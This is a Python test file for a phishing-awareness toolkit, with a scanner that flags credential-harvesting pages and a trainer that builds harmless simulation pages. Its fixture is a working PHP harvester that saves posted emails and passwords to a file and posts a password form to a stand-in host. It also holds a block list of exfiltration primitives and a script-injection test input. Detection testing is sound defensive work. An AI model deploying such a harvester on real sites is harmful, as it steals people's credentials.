#!/usr/bin/env python3
"""Tests for PHISH-AWARENESS tools. Run: python test_phish_awareness.py"""
import importlib.util
import sys
from pathlib import Path

_here = Path(__file__).parent


def _load(name, filename):
    spec = importlib.util.spec_from_file_location(name, _here / filename)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


analyzer = _load("phish_analyzer", "phish_analyzer.py")
trainer = _load("safe_trainer", "safe_trainer.py")

PHISH_PHP = (
    "<?php\n"
    "file_put_contents('usernames.txt', $_POST['email'].' '.$_POST['pass']);\n"
    "header('Location: https://facebook.com/');\n"
    "?>\n"
    "<form action='http://evil.example/collect.php'>"
    "<input type='password' name='pass'></form>"
)

CLEAN_HTML = "<html><body><h1>Welcome</h1><p>Public info page.</p></body></html>"


def test_detects_harvester(tmp):
    f = tmp / "login.php"
    f.write_text(PHISH_PHP, encoding="utf-8")
    report = analyzer.scan_path(f)
    ids = {x["rule_id"] for x in report.findings}
    assert "CRED-STORE-FILE" in ids
    assert "CRED-POST-FIELDS" in ids
    assert "REDIRECT-REAL-SITE" in ids
    assert report.score >= 60
    assert report.verdict.startswith("PHISHING")


def test_clean_page_scores_low(tmp):
    f = tmp / "index.html"
    f.write_text(CLEAN_HTML, encoding="utf-8")
    report = analyzer.scan_path(f)
    assert report.score == 0
    assert report.verdict.startswith("CLEAN")


def test_trainer_stores_nothing():
    page = trainer.build_page("Acme Corp")
    lowered = page.lower()
    # must not contain any exfiltration / persistence primitive
    for forbidden in ("file_put_contents", "fetch(", "xmlhttprequest",
                      "localstorage", "sessionstorage", ".txt", "navigator.sendbeacon"):
        assert forbidden not in lowered, f"trainer must not use {forbidden}"
    assert "phishing simulation" in lowered
    assert "acme corp" in lowered


def test_trainer_escapes_brand():
    page = trainer.build_page("<script>alert(1)</script>")
    assert "<script>alert(1)</script>" not in page  # escaped
    assert "&lt;script&gt;" in page


if __name__ == "__main__":
    import tempfile
    import inspect
    failures = 0
    tmpdir = Path(tempfile.mkdtemp())
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            try:
                if "tmp" in inspect.signature(fn).parameters:
                    fn(tmpdir)
                else:
                    fn()
                print(f"PASS {name}")
            except AssertionError as exc:
                failures += 1
                print(f"FAIL {name}: {exc}")
    sys.exit(1 if failures else 0)
